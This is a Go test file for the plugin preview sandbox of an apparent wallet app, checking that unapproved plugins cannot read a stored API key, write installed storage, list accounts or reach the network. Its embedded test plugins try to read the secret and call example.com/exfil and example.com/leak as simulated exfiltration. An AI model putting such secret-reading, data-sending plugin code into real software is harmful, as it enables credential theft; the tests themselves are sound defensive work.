package app

import (
	"encoding/json"
	"testing"

	"github.com/davirain-su/lintel/internal/pages"
	"github.com/davirain-su/lintel/internal/plugin"
	"github.com/davirain-su/lintel/internal/wallet"
)

func previewPackage(t *testing.T, m plugin.Manifest, source string) plugin.Source {
	t.Helper()
	raw, err := json.Marshal(m)
	if err != nil {
		t.Fatal(err)
	}
	return plugin.Source{Kind: "inline", Package: &plugin.Package{Plugin: raw, Main: source}}
}

func previewStat(t *testing.T, page any, label string) string {
	t.Helper()
	got, ok := page.(pages.Page)
	if !ok {
		t.Fatalf("page = %#v", page)
	}
	for _, section := range got.Sections {
		for _, stat := range section.Stats {
			if stat.Label == label {
				return stat.Value
			}
		}
	}
	t.Fatalf("page has no %q stat: %#v", label, got)
	return ""
}

// TestPreviewDoesNotUseInstalledDataOrCandidateNetwork locks the preview host.
// An unapproved update must not read the installed secret, write the installed
// KV, or fetch a host that only the candidate declared. via=local-api is the
// value POST /v0/installations/{id}/preview passes to PreviewInstallationPage.
func TestPreviewDoesNotUseInstalledDataOrCandidateNetwork(t *testing.T) {
	const secret = "sk-live-SECRET"
	for _, via := range []string{"acp", "local-api"} {
		t.Run(via, func(t *testing.T) {
			a := newTestApp(t)
			id := "local.personal.r21secret"
			installed := plugin.Manifest{
				ID: id, Name: "Secret", Version: "1.0.0", Main: "index.js",
				Permissions: plugin.Permissions{StorageKb: 4},
				Settings:    []plugin.SettingField{{Key: "apiKey", Label: "API key", Secret: true}},
				Navigation:  []plugin.NavItem{{Title: "Overview", Page: "overview"}},
			}
			job, err := a.pluginManager.Propose(previewPackage(t, installed, `export function page() { return { title: "Installed", sections: [] }; }`), "install", "", "", via)
			if err != nil {
				t.Fatal(err)
			}
			if _, err := a.pluginManager.Decide(job.RequestID, true); err != nil {
				t.Fatal(err)
			}
			a.refreshPlugins()
			if err := a.plugins.SetSetting(id, "apiKey", secret); err != nil {
				t.Fatal(err)
			}
			kv, err := a.plugins.KV(id)
			if err != nil {
				t.Fatal(err)
			}
			if err := kv.Put("kept", json.RawMessage(`"yes"`)); err != nil {
				t.Fatal(err)
			}
			hash, err := a.plugins.PackageHash(id)
			if err != nil {
				t.Fatal(err)
			}
			page := `export function page() {
  let k = "";
  let fetched = "";
  try { k = host.setting("apiKey") || ""; } catch (e) { k = "threw"; }
  try { host.kv.put("preview-wrote", "yes"); } catch (e) {}
  try {
    host.fetch("https://example.com/exfil");
    fetched = "sent";
  } catch (e) { fetched = String(e).includes("allowlist") ? "refused" : "other"; }
  return { title: "Preview", sections: [{ stats: [
    { label: "secret", value: k || "none" },
    { label: "fetch", value: fetched }
  ] }] };
}`
			update := installed
			update.Version = "1.0.1"
			update.Permissions.Network = []string{"example.com"}
			pending, err := a.pluginManager.Propose(previewPackage(t, update, page), "update", id, hash, via)
			if err != nil {
				t.Fatal(err)
			}
			result, err := a.PreviewInstallationPage(pending.RequestID, "overview", via)
			if err != nil {
				t.Fatalf("preview: %v", err)
			}
			if value := previewStat(t, result.Page, "secret"); value != "none" {
				t.Fatal("preview revealed the installed secret")
			}
			if fetched := previewStat(t, result.Page, "fetch"); fetched != "refused" {
				t.Fatalf("preview fetch = %q, want the candidate-only host refused", fetched)
			}
			if value, ok := kv.Get("preview-wrote"); ok {
				t.Fatalf("preview wrote the installed KV: %s", value)
			}
			if value, ok := kv.Get("kept"); !ok || string(value) != `"yes"` {
				t.Fatalf("installed KV changed: %s ok=%v", value, ok)
			}
			current, err := a.pluginManager.GetInstallation(pending.RequestID)
			if err != nil || current.Status != "pending" {
				t.Fatalf("candidate = %+v %v", current, err)
			}
		})
	}
}

func TestFreshInstallPreviewDoesNotExposeAccountsOrFetch(t *testing.T) {
	a := newTestApp(t)
	a.settings.Accounts = []wallet.Address{{Addr: viewAddr, Label: "Main"}}
	id := "local.personal.r21fresh"
	page := `export function page() {
  let n = 0;
  let fetched = "";
  try {
    const accounts = host.accounts() || [];
    n = accounts.length;
  } catch (e) { n = -1; }
  try {
    host.fetch("https://example.com/leak");
    fetched = "sent";
  } catch (e) { fetched = String(e).includes("allowlist") ? "refused" : "other"; }
  return { title: "Preview", sections: [{ stats: [
    { label: "count", value: String(n) },
    { label: "fetch", value: fetched }
  ] }] };
}`
	manifest := plugin.Manifest{
		ID: id, Name: "Fresh", Version: "1.0.0", Main: "index.js",
		Permissions: plugin.Permissions{Network: []string{"example.com"}, Read: []string{"balances"}},
		Navigation:  []plugin.NavItem{{Title: "Overview", Page: "overview"}},
	}
	job, err := a.pluginManager.Propose(previewPackage(t, manifest, page), "install", "", "", "acp")
	if err != nil {
		t.Fatal(err)
	}
	result, err := a.PreviewInstallationPage(job.RequestID, "overview", "acp")
	if err != nil {
		t.Fatalf("preview: %v", err)
	}
	if previewStat(t, result.Page, "count") != "0" {
		t.Fatal("fresh preview exposed watched accounts")
	}
	if fetched := previewStat(t, result.Page, "fetch"); fetched != "refused" {
		t.Fatalf("fresh preview fetch = %q, want no network", fetched)
	}
	current, err := a.pluginManager.GetInstallation(job.RequestID)
	if err != nil || current.Status != "pending" {
		t.Fatalf("candidate = %+v %v", current, err)
	}
	if _, err := a.plugins.Get(id); err == nil {
		t.Fatal("preview installed the candidate")
	}
}
